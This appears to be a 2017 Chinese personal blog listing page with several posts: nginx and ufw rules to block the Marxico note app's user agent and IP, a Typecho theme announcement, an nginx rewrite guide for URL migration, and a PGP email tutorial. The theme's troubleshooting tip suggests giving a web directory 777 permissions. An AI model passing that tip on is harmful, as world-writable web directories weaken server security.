<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以啊，这玩意快扔垃圾桶吧，http是最不能忍的，一丝一毫都不能忍……<a target="_blank" rel="noopener" href="https://fiveyellowmice.com/posts/2015/10/fight-a-peoples-war-for-https.html">全站HTTPS是必须的</a>！全世界最大的黄网<a target="_blank" rel="noopener" href="https://thenextweb.com/insider/2017/03/31/pornhub-youporn-https-isp/">pornhub都上https了</a>，咱还有啥理由不拥抱全站https啊？</p>
<p>当然了，有些人大可以说，我不在乎我的隐私，嗯这就好似有些人说”政治与我无关”一样。</p>
<p>然而我个人是非常在乎我的、以及我的访客的隐私，这也是我没有开启评论UA、更别提把地理位置信息啥的暴露给大众的原因。</p>
<p>所以在我<a target="_blank" rel="noopener" href="https://dmesg.app/greengrapes2.html">为小蜗牛童鞋二次开发的主题</a>中，UA选项选项默认是关闭的（那俺为啥要开发这个功能呢？没事闲的、写点程序练练手、满足一下内心那可怕的心理需求、刷刷存在感呗）的确，我可以通过日志、通过访问统计工具来获得访客的UA等信息，如果我想，我可以分析出来一个人都看了什么（很显然我啥时候闲的有这个功夫了）。但是这只有我才能做到，这也就意味着我需要对访客的隐私负责—— 我需要做好服务器的安全工作，保护日志不外泄，尽管访客可能毫不在意这点。</p>
<p>好吧，说实话，其实我是装有Random User-Agent的……</p>
<h2 id="其他markdown替代品"><a href="#其他markdown替代品" class="headerlink" title="其他markdown替代品"></a>其他markdown替代品</h2><p>有人可能会问了，有没有啥markdown替代品啊？嗯，在Windows下我使用markdown pad2，在Linux下我使用Remarkable（这家伙也要出Windows版本的，只是一直是Under development）。</p>
<p>[v_blue]The view has crashed? 如果你使用的是Windows 8及更新版本，markdown pad2可能会有这么一条警告导致无法预览。解决方案很简单，<a target="_blank" rel="noopener" href="http://markdownpad.com/download/awesomium_v1.6.6_sdk_win.exe">下载awesomium</a>并安装就好啦[&#x2F;v_blue]</p>
<h2 id="更狠一步的解决方案"><a href="#更狠一步的解决方案" class="headerlink" title="更狠一步的解决方案"></a>更狠一步的解决方案</h2><p>对于这么嚣张的玩意，我一直是深恶痛绝的，那怎么再以身作则玩一玩呢？</p>
<h3 id="屏蔽马克飞象UA"><a href="#屏蔽马克飞象UA" class="headerlink" title="屏蔽马克飞象UA"></a>屏蔽马克飞象UA</h3><p>咦，是不是日志中记录了这么一串UA</p>
<p>Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Marxico&#x2F;1.0.0 Chrome&#x2F;47.0.2526.110 Electron&#x2F;0.36.10 Safari&#x2F;537.36</p>
<p>那好办了，找到自己的nginx配置文件，server段里加这么一句</p>
<p>if ($http_user_agent ~* (Marxico)) {<br>return 403;<br>}</p>
<p>然后重启Nginx</p>
<p>&#x2F;etc&#x2F;init.d&#x2F;nginx reload</p>
<p>就好了，假如要禁止掉多个UA，那就用管道隔开，形如<code>python-requests|Python-urllib|Marxico</code>就可以了。</p>
<h3 id="Nginx屏蔽马克飞象IP"><a href="#Nginx屏蔽马克飞象IP" class="headerlink" title="Nginx屏蔽马克飞象IP"></a>Nginx屏蔽马克飞象IP</h3><p>呐，这个很简单，直接来一句<code>deny 115.29.201.173;</code>然后重启Nginx即可。 当然了我这人超级爱黑名单，所以都是新建一个名为<code>blackip.conf</code>，里面写满了那些我讨厌的IP，然后<code>nginx.conf</code>里直接<code>include blackip.conf</code></p>
<h3 id="UFW-x2F-iptables屏蔽马克飞象IP"><a href="#UFW-x2F-iptables屏蔽马克飞象IP" class="headerlink" title="UFW&#x2F;iptables屏蔽马克飞象IP"></a>UFW&#x2F;iptables屏蔽马克飞象IP</h3><p>这个就更暴力了，直接来一句</p>
<p>ufw insert 1 deny from 115.29.201.173 to any</p>
<p>世界清净了</p>
<h2 id="最后的致歉"><a href="#最后的致歉" class="headerlink" title="最后的致歉"></a>最后的致歉</h2><p>如果原先的防盗链的图给小蜗牛童鞋造成了困扰，那么深表歉意……我是故意的，有一些事情，大概就是它原本的样子，也许只是内心深处最后的挣扎与冲突吧——如果，没有如果。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/05/no-more-maxiang/index/" data-id="clhp7rthu0061s2qraiwl0xtj" data-title="为了你的隐私考虑，别用马克飞象了" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-greengrapes2/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/01/greengrapes2/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-01T00:00:00.000Z" itemprop="datePublished">2017-04-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>►<a class="article-category-link" href="/categories/program/share/">share</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/01/greengrapes2/index/">一款功能丰富的、好看的、性能优秀的typecho绿色主题：GreenGrapes2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>喵！虽说本站是WordPress，但是这仍无法阻碍我搞Typecho的心~今天俺就来推荐一款Typecho主题，这个主题是在<a target="_blank" rel="noopener" href="https://github.com/hongweipeng/GreenGrapes">这个</a>的基础上进一步优化改善的，不需要任何插件就能运行，并且完美支持https。先来看一张首页截图吧！ [v_blue]注意，此主题的更新说明请到GitHub上查看，我太懒了可能不会更新这里……[&#x2F;v_blue]</p>
<h2 id="首页截图"><a href="#首页截图" class="headerlink" title="首页截图"></a>首页截图</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040105133678.png"><img src="/images/2017040105133678.png"></a></p>
<h2 id="文章标签"><a href="#文章标签" class="headerlink" title="文章标签"></a>文章标签</h2><p>默认会显示作者、分类、发布时间、浏览量、字数统计、最后更新日期。登录之后还会有编辑按钮。新文发布会在标题前面有个new</p>
<p><img src="/images/040117_0502_1.png"></p>
<h2 id="分享功能"><a href="#分享功能" class="headerlink" title="分享功能"></a>分享功能</h2><p>插件来自<a target="_blank" rel="noopener" href="https://github.com/revir/need-more-share2">Revir</a>，默认已开启分享到QQ空间、微博、微信、Twitter、Facebook等，修改主题文件可以获得更多支持。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040105163525.png"><img src="/images/2017040105163525.png"></a></p>
<h2 id="实用的侧边"><a href="#实用的侧边" class="headerlink" title="实用的侧边"></a>实用的侧边</h2><p>侧边栏新加了分类和管理</p>
<p><img src="/images/040117_0502_3.png"></p>
<h2 id="有趣的页脚"><a href="#有趣的页脚" class="headerlink" title="有趣的页脚"></a>有趣的页脚</h2><p>页脚包含建站时间、加载耗时。</p>
<p><img src="/images/040117_0502_4.png"></p>
<h2 id="优秀的头像缓存策略"><a href="#优秀的头像缓存策略" class="headerlink" title="优秀的头像缓存策略"></a>优秀的头像缓存策略</h2><p>如果访客填写了QQ邮箱，那么将会显示QQ头像；否则将会根据邮箱去Gravatar获取头像。如果连Gravatar也没有，那么就会显示默认的头像。启用了缓存策略，妈妈再也不怕加载好几秒钟了~默认超时时间为14天，可在主题中自行设定。</p>
<p><img src="/images/040117_0502_5.png"></p>
<h2 id="支持Android版Chrome通知栏变色"><a href="#支持Android版Chrome通知栏变色" class="headerlink" title="支持Android版Chrome通知栏变色"></a>支持Android版Chrome通知栏变色</h2><p>也就是<code>meta theme color</code></p>
<p><img src="/images/040117_0502_6.png"></p>
<h2 id="评论框输入特效"><a href="#评论框输入特效" class="headerlink" title="评论框输入特效"></a>评论框输入特效</h2><p><img src="/images/040117_0502_7.png"></p>
<h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040500242379.png"><img src="/images/2017040500242379.png"></a></p>
<h2 id="评论区显示UA"><a href="#评论区显示UA" class="headerlink" title="评论区显示UA"></a>评论区显示UA</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/201704050029415.png"><img src="/images/201704050029415.png"></a></p>
<p>[v_error]注意： 对于我这种对隐私要求比较高的人，我是不想把评论者的UA、更别提是地理位置信息暴露给大众的了，所以这个选项默认是关闭的。的确，我可以通过日志、通过访问统计工具来获得访客的UA等信息，但是这只有我才能做到，这也就意味着我需要对访客的隐私负责——尽管访客可能毫不在意这点。好吧，其实我是装有Random User-Agent的……[&#x2F;v_error]</p>
<p> </p>
<h2 id="演示站"><a href="#演示站" class="headerlink" title="演示站"></a>演示站</h2><p><a target="_blank" rel="noopener" href="https://www.tougetu.com/">奔跑的蜗牛壳</a>（此站点同时也启用了其他的插件，在外观上，包括Snow、Kiana）</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>下载Typecho主题</p>
<p>重命名整个文件夹为<code>GreenGrapes2</code>并上传至<code>usr/themes/</code>目录下</p>
<p>登陆自己的博客后台，在”控制台”的下拉菜单中选择”外观”选项进入已安装主题列表</p>
<p>在相应的主题点击”启用”即可使用</p>
<h2 id="Troubleshooting"><a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h2><h3 id="页脚加载耗时很长"><a href="#页脚加载耗时很长" class="headerlink" title="页脚加载耗时很长"></a>页脚加载耗时很长</h3><p>请首先确认是不是第一次使用本主题并且打开了一个含有大量评论的页面？如果是的话，那么第一次获取QQ头像&#x2F;Gravatar会比较耗时（尤其是当服务器在墙国的时候），耐心等待直到缓存成功即可。</p>
<p>[v_tips]PS：如果在已有一些评论的博客上换上此主题，建议手动用touch命令修改下<code>avatarCache</code>中头像的时间戳为不同的时间日期，免得一次性加载太多导致延迟。示例命令：<code>touch -cmt 201703291216 xxx.jpg</code>[&#x2F;v_tips]</p>
<h3 id="头像加载失败"><a href="#头像加载失败" class="headerlink" title="头像加载失败"></a>头像加载失败</h3><p>确认下主题目录下存在<code>avatarCache</code>这个目录。是否有足够的权限写入？通常来说www:www&#x2F;755或者干脆777就可以了。</p>
<h3 id="更换首页头像、默认头像等"><a href="#更换首页头像、默认头像等" class="headerlink" title="更换首页头像、默认头像等"></a>更换首页头像、默认头像等</h3><p>主题设置中设置个url或者替换img目录下的图片文件</p>
<h3 id="增加、修改分享选项"><a href="#增加、修改分享选项" class="headerlink" title="增加、修改分享选项"></a>增加、修改分享选项</h3><p><code>post.php</code>中的第164行<code>data-share-networks</code>中的字符串就是控制显示内容的。目前支持的选项有Weibo,Wechat,Douban,QQZone,Twitter,Pinterest,Facebook,GooglePlus,Reddit,Linkedin,Tumblr,Evernote,RenRen。更多详细设置请参考<a target="_blank" rel="noopener" href="https://github.com/revir/need-more-share2">Revir</a></p>
<p>[v_error]注意：移动设备上请注意分享的栏目不要太多，否则破坏自适应布局可能会使浏览不方便。[&#x2F;v_error]</p>
<h3 id="修改打字特效"><a href="#修改打字特效" class="headerlink" title="修改打字特效"></a>修改打字特效</h3><p><code>footer.php</code>中第29、30行是控制打字特效的。可以根据自己情况选择true或者是false</p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2'/]GreenGrapes2/[/gt/]">https://github.com/BennyThink/GreenGrapes2&#39;\]GreenGrapes2\[/gt\]</a> 突然发现GitHub字体变大、变粗了。</p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>俺不是搞Web开发的，但是如果有任何建议，欢迎<a href="mailto:benny@bennythink.com">发邮件</a>、本文评论、<a target="_blank" rel="noopener" href="https://www.tougetu.com/">奔跑的蜗牛壳</a>评论、发issue。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>Some of us get dipped in flat, some in satin, some in gloss. But every once in a while you find someone who’s iridescent, and when you do, nothing will ever compare.</p>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢<a target="_blank" rel="noopener" href="https://github.com/hongweipeng/GreenGrapes">hongweipeng</a>的设计，这是我开发的基础；感谢<a target="_blank" rel="noopener" href="https://www.tougetu.com/">小蜗牛童鞋</a>的选择与信任，这是我开发的动力，嘻嘻嘻。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/01/greengrapes2/index/" data-id="clhp7rtgi003gs2qrdg0od7vt" data-title="一款功能丰富的、好看的、性能优秀的typecho绿色主题：GreenGrapes2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-nginx-jekyll-typecho/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/03/28/nginx-jekyll-typecho/index/" class="article-date">
  <time class="dt-published" datetime="2017-03-28T00:00:00.000Z" itemprop="datePublished">2017-03-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/website/">website</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/03/28/nginx-jekyll-typecho/index/">我和Nginx二级目录rewrite、Jekyll、Typecho的故事</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>几天前<a target="_blank" rel="noopener" href="https://www.tougetu.com/">小蜗牛童鞋</a>决定从Jekyll回到Typecho，好像也没啥大不了的。好在这俩都是支持markdown的，笨方法就是复制粘贴手动处理下。 于是乎很快的上了HTTPS+HSTS+HSTS Preload List，随后不久发现问题来了。 在SEO上有这么个问题，原来的url都是形如<code>http://mingyueli.com/cn/2016/11/03/python-backup-script/</code>这样的，但是现在对应的URL却是<code>https://www.tougetu.com/2016/11/python-backup-script.html</code></p>
<p>我们仔细观察下能发现，现在多了个<code>www</code>，少了个<code>cn</code>，少了个日期，最后少了个<code>/</code>多了个<code>.html</code> 原来的URL模式下Google已经收录了一些，现在的也收录了好些（好像是今天一天爬的），但是现在访问原来的URL会404，蜘蛛怎么会喜欢404呢？所以作为一个有灵性的码农，咱自然要处理下这个问题。我想了这么几个方案：</p>
<p>1.原来的url管他什么的，就跳转到现在的主页； 2.对现在的永久链接格式进行一点修改，给加上日期这一行； 3.把原来的url完美跳转到现在的模式</p>
<h2 id="1-直接跳转主页"><a href="#1-直接跳转主页" class="headerlink" title="1. 直接跳转主页"></a>1. 直接跳转主页</h2><p>第一个最简单了，直接在<code>mingyue.com.conf</code>中server段加个<code>rewrite ^/cn/(.*)/$ https://www.tougetu.com/;</code>就可以了。这样的话管他是啥样的，都给定向到首页了。 这样对搜索引擎倒是没太大事，但是访客们可能就懵逼了，我要看的博文咋变成首页了？通常来说大部分人在大部分情况下就会选择关闭了。</p>
<h2 id="2-更改永久链接并跳转"><a href="#2-更改永久链接并跳转" class="headerlink" title="2.更改永久链接并跳转"></a>2.更改永久链接并跳转</h2><p>第二个方案需要进入Typecho后台，将永久链接（也就是固定链接啦）改成<code>/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;slug&#125;.html</code>，rewrite规则如下：</p>
<p>rewrite ^&#x2F;cn&#x2F;(.*)&#x2F;$ <a target="_blank" rel="noopener" href="https://www.tougetu.com/">https://www.tougetu.com/</a>;</p>
<p>访客们倒是能被重定向到对应的新博文，但是这样对SEO就有一些影响了，毕竟Google已经爬了好些，咱再改永久链接不好啊。</p>
<h2 id="3-完美的解决方案"><a href="#3-完美的解决方案" class="headerlink" title="3.完美的解决方案"></a>3.完美的解决方案</h2><p>第三个方案则是最好的，rewrite规则如下：</p>
<p>rewrite “^&#x2F;cn&#x2F;([0-9]{4})&#x2F;([0-9]{2})&#x2F;([0-9]{2})&#x2F;(.*)&#x2F;$” <a target="_blank" rel="noopener" href="https://www.tougetu.com/$1/$2/$4.html">https://www.tougetu.com/$1/$2/$4.html</a>;</p>
<p>这样蜘蛛们也看不到404，访客们又能被重定向到新的正确的地址下。 头一次体验到了<code>/etc/init.d/nginx reload</code>是多么的有用</p>
<h2 id="后续总结与思考"><a href="#后续总结与思考" class="headerlink" title="后续总结与思考"></a>后续总结与思考</h2><p>我对Nginx的了解也不多吧，但是通过这次，我至少知道了一点点rewrite的写法，下面总结一下备忘并分享给可能遇到了一样坑爹问题的童鞋们吧！ rewrite语法：rewrite regex replacement flag 第二个regex是正则表达式，第三个是替换之后，第四个是标志，有这么四个 1.last 相当于apache里面的[L]标记，表示rewrite。 2.break本条规则匹配完成后，终止匹配，不再匹配后面的规则。 3.redirect 返回302临时重定向，浏览器地址会显示跳转后的URL地址。 4.permanent 返回301永久重定向， 浏览器地址会显示跳转后的URL地址。</p>
<p>在正则中如果需要使用{}则需要用双引号或者是单引号把正则扩起来（因为nginx中{}标志着块的结束和开始）</p>
<hr>
<p>所以，上面我这一串正则<code>^/cn/([0-9]&#123;4&#125;)/([0-9]&#123;2&#125;)/([0-9]&#123;2&#125;)/(.*)/$</code>含义就是： 匹配&#x2F;cn&#x2F;开头的、0到9数字出现四次、&#x2F;、0-9数字出现2次、&#x2F;、0-9数字出现两次、&#x2F;、任意字符、&#x2F;结尾 再看下我们原始的URL <code>http://mingyueli.com/cn/2016/11/03/python-backup-script/</code> 非常恰当的匹配上了，然后$1的含义就是第一对()中的内容，$2的含义就是第二对()，依此类推……所以$1&#x2F;$2&#x2F;$4也就对应这2016、11、 python-backup-script，组合起来也就是<code>2016/11/python-backup-script.html</code>，于是任务就结束咯。 当然这样也有一些还是无法处理，比如说后来自己改了url的……本大神虽说很厉害，但是这样也是很无奈的呀！</p>
<p>所以说啊，学好正则简直太重要了嘛！正则表达式无处不在嘛！不会正则好意思说自己是用Linux的嘛，是吧。</p>
<p>想当初我换域名和换二级目录的时候，我也是这么折腾过，只不过那时候不会用rewrite什么的。 所以总结就是，做好统筹规划工作，然后再干事吧！耶！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/03/28/nginx-jekyll-typecho/index/" data-id="clhp7rthq005ps2qrg2qmdeql" data-title="我和Nginx二级目录rewrite、Jekyll、Typecho的故事" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-encrypted-email/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/03/26/encrypted-email/index/" class="article-date">
  <time class="dt-published" datetime="2017-03-26T00:00:00.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/it/">it</a>►<a class="article-category-link" href="/categories/it/security/">security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/03/26/encrypted-email/index/">[新手向]使用Thunderbird + Enigmail 发送加密邮件</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这是一个为新手准备的从无到有的发送加密邮件的教程，老手请略过~</p>
<p>我的公钥请戳导航栏</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/03/2017032611171183.jpg"><img src="/images/2017032611171183.jpg"></a></p>
<h2 id="前言：为何要发送加密邮件"><a href="#前言：为何要发送加密邮件" class="headerlink" title="前言：为何要发送加密邮件"></a>前言：为何要发送加密邮件</h2><p>在电影《斯诺登》中，斯诺登就要求她的女朋友使用加密邮件和她通信，并且说，很简单，其实真的很简单。</p>
<p>如今情况越来越变得严峻，加密邮件是保护隐私的重要手段之一。</p>
<p>一些邮箱只提供不加密的SMTP&#x2F;IMAP&#x2F;POP3，这些通信过程无疑是具有被偷窥、劫持的风险的；有些提供了支持SSL&#x2F;TLS的SMTP，但是我们仍然无法保证服务器的偷窥、审查。</p>
<p>保护隐私的理由大概不用说什么了。</p>
<h2 id="第零步：使用条件、准备工具"><a href="#第零步：使用条件、准备工具" class="headerlink" title="第零步：使用条件、准备工具"></a>第零步：使用条件、准备工具</h2><p>考虑到广大读者都是使用Windows的，所以此次使用Windows下的Thunderbird + Enigmail作为示例。对于Linux、Mac OS，Thunderbird也是有的，基本操作也都是类似的。</p>
<p>准备工具：<a target="_blank" rel="noopener" href="https://www.mozilla.org/zh-CN/thunderbird/">Mozilla Thunderbird</a></p>
<p>没错就是小狐狸的那个Mozilla（不过Mozilla已经不再管Thunderbird了）</p>
<p><img src="/images/firefoxdoge.gif"></p>
<p>看我百变doge</p>
<p>当然啦咱得准备个邮箱……</p>
<p>为了方便起见，咱给Thunderbird的菜单添加出来。如图所示</p>
<p><img src="/images/032617_1053_Thunderb1.png"></p>
<h2 id="第一步：配置邮箱"><a href="#第一步：配置邮箱" class="headerlink" title="第一步：配置邮箱"></a>第一步：配置邮箱</h2><p>打开Thunderbird，在主页面选择创建新账户-电子邮件（或者右上角菜单-选项-账户设置-（左下角）添加邮件账户，会进入如图所示页面，我们输入自己的邮箱和密码</p>
<p><img src="/images/032617_1053_Thunderb2.png"></p>
<p>点击继续，有的时候Thunderbird无法找到正确的SMTP&#x2F;IMAP服务器，那咱就要手动配置下。具体的SMTP&#x2F;IMAP服务器，参考你的邮箱的帮助。</p>
<p>[v_blue]腾讯企业邮是 smtp.exmail.qq.com 端口465 imap.exmail.qq.com 端口993 QQ邮箱是 smtp.qq.com端口465 imap.qq.com端口993[&#x2F;v_blue]</p>
<p>正确填入信息之后，点击重新测试按钮。</p>
<p><img src="/images/032617_1053_Thunderb3.png"></p>
<p>之后点击完成，Thunderbird会验证密码</p>
<p><img src="/images/032617_1053_Thunderb4.png"></p>
<p>[v_tips]注意： 1.有些邮箱默认不开启SMTP、IMAP服务，有些邮箱默认需要一个特殊的动态密码才能够使用邮件客户端。遇到这种情况请查看对应邮箱的帮助和设置文档。 2.有时如果没有重新测试按钮，可能是因为启用了Enigmail扩展。请暂时将其禁用。 3.Thunderbird默认会把发送后的邮件保存到已发送文件夹，在某些邮件服务商下这一步骤可能会耗费很长时间，所以如果遇到类似问题，可以在账户设置中取消这个选项。 <img src="/images/032617_1053_Thunderb5.png">[&#x2F;v_tips]</p>
<h2 id="第二步：安装Enigmail-扩展"><a href="#第二步：安装Enigmail-扩展" class="headerlink" title="第二步：安装Enigmail 扩展"></a>第二步：安装Enigmail 扩展</h2><p>在Thunderbird的菜单-附加组件中搜索Enigmail并安装。这一步大概是个人都会吧……</p>
<h2 id="第三步：添加一对密钥"><a href="#第三步：添加一对密钥" class="headerlink" title="第三步：添加一对密钥"></a>第三步：添加一对密钥</h2><p>Enigmail-安装向导-我更喜欢扩展配置（其实普通的也行）。相信大部分用户都会有这么个提示：需要GnuPG什么的。</p>
<p>咱就点上面的安装吧，之后他会为我们下载GnuPG并运行，咱只要无脑下一步就可以啦。</p>
<p>之后，我们选择”我想为数字签名和加密邮件创建新的密钥对”，如下图所示</p>
<p><img src="/images/032617_1053_Thunderb6.png"></p>
<p>此时由于我们的Thunderbird只添加了一个邮箱，所以这里默认就是为这个邮箱创建密钥对。</p>
<p><img src="/images/032617_1053_Thunderb7.png"></p>
<p>这里需要输入一个密码，并且一定要牢记。</p>
<p>点击下一步之后，就是等待。当进度条走到最后的时候，屏幕上会提示您的密钥已生成。此时如果不想生成证书废除，点取消-关闭就可以啦。</p>
<p><img src="/images/032617_1053_Thunderb8.png"></p>
<p>[v_blue]备注：无法下一步的原因是因为没有”创建证书废除”，所谓证书废除就是能够废除你的公钥的那个玩意，如果大家觉得有必要的话，生成也是可以的。[&#x2F;v_blue]</p>
<h2 id="第三步：添加其他人公钥"><a href="#第三步：添加其他人公钥" class="headerlink" title="第三步：添加其他人公钥"></a>第三步：添加其他人公钥</h2><p>我们想要给其他人发邮件，必然要有其他人的公钥，所以这里大家得找个公钥，比如说我的公钥你可以<a target="_blank" rel="noopener" href="https://dmesg.app/my-gpg">这里下载</a></p>
<p>下载完成之后，Enigmail-密钥管理-文件-从文件导入密钥，选择下载的公钥（通常扩展名是asc），之后在密钥管理器里面我们可以看见导入的公钥</p>
<p><img src="/images/032617_1053_Thunderb9.png"></p>
<h2 id="第四步：启用选定身份的邮件加密"><a href="#第四步：启用选定身份的邮件加密" class="headerlink" title="第四步：启用选定身份的邮件加密"></a>第四步：启用选定身份的邮件加密</h2><p>导入公钥之后，就可以发送加密邮件啦。这一步仅需要设置一次。点击新建消息，</p>
<p>我们点击Enigmail的工具条中红框所示按钮，点击配置，</p>
<p><img src="/images/032617_1053_Thunderb10.png"></p>
<p>选择”为这个标识打开OpenPGP……”其他选项默认即可。</p>
<p><img src="/images/032617_1053_Thunderb11.png"></p>
<p>之后Enigmail会再次弹出来，问我们选择何种加密方式</p>
<p><img src="/images/032617_1053_Thunderb12.png"></p>
<p>我们确保勾选了”加密邮件”这个选项，其他默认不动，确定即可。</p>
<p>[v_blue]注： 我们可以在选项-账户设置-OpenPGP中启用。操作方式是一样的。[&#x2F;v_blue]</p>
<h2 id="第五步：附送公钥并发送邮件"><a href="#第五步：附送公钥并发送邮件" class="headerlink" title="第五步：附送公钥并发送邮件"></a>第五步：附送公钥并发送邮件</h2><p>在刚刚的新建消息页面，我们输入邮箱、主题、正文，确保工具栏中Enigmail提示已加密。然后菜单栏中选择Enigmail-附加公钥（或者直接点工具栏的附送我的公钥也可以），选择自己邮箱的公钥。之后发送即可。 [v_blue]注： 想要双向通信，就要让对方也持有你的公钥，否则这通信就会是单向的了。[&#x2F;v_blue]</p>
<h2 id="第六步：查看加密邮件并回复"><a href="#第六步：查看加密邮件并回复" class="headerlink" title="第六步：查看加密邮件并回复"></a>第六步：查看加密邮件并回复</h2><p>我们打开Thunderbird并选择获取消息，会发现这么一个新的邮件</p>
<p>我们只要点击标题，输入密码即可成功解密啦。</p>
<p><img src="/images/032617_1053_Thunderb13.png"></p>
<p>那么我们如何回复呢？简单的点击回复，输入正文，确保Enigmail提示此消息将被加密，发送即可。</p>
<p><img src="/images/032617_1053_Thunderb14.png"></p>
<h2 id="补遗和备注："><a href="#补遗和备注：" class="headerlink" title="补遗和备注："></a>补遗和备注：</h2><h3 id="我该如何导入别人的公钥呢？"><a href="#我该如何导入别人的公钥呢？" class="headerlink" title="我该如何导入别人的公钥呢？"></a>我该如何导入别人的公钥呢？</h3><p>我们可以从<strong>可信的地方</strong>（他的分享在HTTPS博客站上的公钥下载、密钥服务器、面交）、邮件附送的公钥<strong>确认这个公钥的合法性</strong>，之后在Enigmail的密钥管理中根据情况使用文件-从文件导入密钥、编辑-从剪贴板导入密钥、或者Thunderbird直接右键导入即可。</p>
<h3 id="我该如何分享我的公钥"><a href="#我该如何分享我的公钥" class="headerlink" title="我该如何分享我的公钥"></a>我该如何分享我的公钥</h3><p>在Enigmail的密钥管理中，点击你的邮箱，选择导出密钥到文件，然后选择只导出公钥。之后你可以通过将这个文件贴到自己的博客上，存到U盘里等安全的方式来交换密钥。</p>
<p><img src="/images/032617_1053_Thunderb15.png"></p>
<p>[v_error]注： 可以将公钥的内容复制粘贴作为博文发布，但是WordPress处理五个-的时候会转义，敬请注意。[&#x2F;v_error]</p>
<h3 id="密钥的信任是一个很重要的问题"><a href="#密钥的信任是一个很重要的问题" class="headerlink" title="密钥的信任是一个很重要的问题"></a>密钥的信任是一个很重要的问题</h3><p>这个可以算得上是社会学问题了，我们可以想象下如果用中间人劫持的手段对付公钥密码，将会是怎样的情景。</p>
<h3 id="GnuPG能够保护的信息"><a href="#GnuPG能够保护的信息" class="headerlink" title="GnuPG能够保护的信息"></a>GnuPG能够保护的信息</h3><p>邮件正文以及附件。收件人、发件人、邮件主题都是<strong>无法被保护的</strong>。</p>
<p>注意：只有PGP&#x2F;MIME才可以保护邮件附件（包括文件名）；内嵌PGP不可以。</p>
<h3 id="Linux用户的另类方法"><a href="#Linux用户的另类方法" class="headerlink" title="Linux用户的另类方法"></a>Linux用户的另类方法</h3><p>使用Linux的用户，在导入了密钥之后，咱还可以用<code>gpg2 -d</code>来解密，<code>gpg2 –e -a</code>来加密。</p>
<h2 id="在移动设备上的类似工具"><a href="#在移动设备上的类似工具" class="headerlink" title="在移动设备上的类似工具"></a>在移动设备上的类似工具</h2><p>这个……我只知道Android上有个APG可以用来解密、加密PGP Message……</p>
<h2 id="备注……"><a href="#备注……" class="headerlink" title="备注……"></a>备注……</h2><p>如果你收到了enigmail发的邮件，但是自己只有cli的gpg，那么怎么办呢？直接把encrypt.asc解密了，扩展名改成eml，用任意的邮件客户端打开就可以啦</p>
<h2 id="参考与其他"><a href="#参考与其他" class="headerlink" title="参考与其他"></a>参考与其他</h2><p>更多从参考资料，请阅读如下文章：</p>
<p><a target="_blank" rel="noopener" href="https://securityinabox.org/zh/guide/thunderbird/windows/">https://securityinabox.org/zh/guide/thunderbird/windows/</a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/encryption-gpg-veracrypt.html">https://dmesg.app/encryption-gpg-veracrypt.html</a> <a target="_blank" rel="noopener" href="https://getfreedom.life/191/">https://getfreedom.life/191/</a></p>
<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>大家快来给我发加密邮件吧！会发送加密邮件的都是大神哟！感谢某个可爱的小童鞋……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/03/26/encrypted-email/index/" data-id="clhp7rtg9002ps2qrb6iza27t" data-title="[新手向]使用Thunderbird + Enigmail 发送加密邮件" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
